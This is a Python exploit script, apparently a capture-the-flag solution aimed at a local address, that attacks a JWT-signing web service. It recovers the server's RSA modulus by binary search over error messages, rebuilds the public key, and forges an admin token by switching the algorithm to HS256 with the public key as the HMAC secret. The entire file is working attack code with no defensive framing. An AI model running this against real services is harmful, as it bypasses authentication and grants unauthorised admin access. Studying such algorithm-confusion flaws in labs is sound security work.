from Crypto.Util.number import long_to_bytes as l2b
from Crypto.Util.number import bytes_to_long as b2l
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Hash import HMAC, SHA256
from base64 import urlsafe_b64encode as enc
from base64 import urlsafe_b64decode as dec
from base64 import b64encode
import requests
import json
import re
import sys


def check(n, token_base):
    sys.stdout.write('\rMODULUS: {:x} '.format(n))
    signature = enc(l2b(n)).strip(b'=').decode()
    resp = requests.get('http://172.17.0.2/?token={}.{}'.format(token_base, signature))
    if 'Signature representative out of range in' in resp.text:
        return True
    if 'Invalid signature in' in resp.text:
        return True
    return False


def binary_search(inf, sup, token_base):
    while (sup - inf) > 1:
        med = (inf + sup) // 2
        if check(med, token_base):
            if (sup - inf) <= 2:
                return med
            sup = med
        else:
            if (sup - inf) <= 2:
                return sup
            inf = med
    return sup


# getting the original token
resp = requests.get('http://172.17.0.2/')
token = re.findall('name="token" value="([^"]+)"', resp.text)[0]
token_base = '.'.join(token.split('.')[:2])
signature = token.split('.')[2]

print('TOKEN BASE: {}'.format(token_base))
print('SIGNATURE: {}'.format(signature))

# finding the modulus by binary search
inf = b2l(dec(signature + '=='))
sup = 2*inf
while not check(sup, token_base):
    inf = sup
    sup = 2*inf
n = binary_search(inf, sup, token_base)
n = n - 1   # fixing the modulus

sys.stdout.write('\rMODULUS: {:x} \n'.format(n))

# rebuild public key
e = 0x10001
public_key = RSA.construct((n, e)).export_key()
public_key = public_key + b'\n'     # fix for openssl
print(public_key.decode())
print('BASE64 ENCODED KEY: {}'.format(b64encode(public_key)))

# forging an admin token
header = enc(json.dumps({'alg': 'HS256'}).encode()).strip(b'=')
body = enc(json.dumps({'is_admin': True}).encode()).strip(b'=')
signature = enc(HMAC.new(
    public_key,
    b'.'.join([header, body]),
    SHA256
).digest()).strip(b'=')
token = b'.'.join([header, body, signature])
print('TOKEN: {}'.format(token.decode()))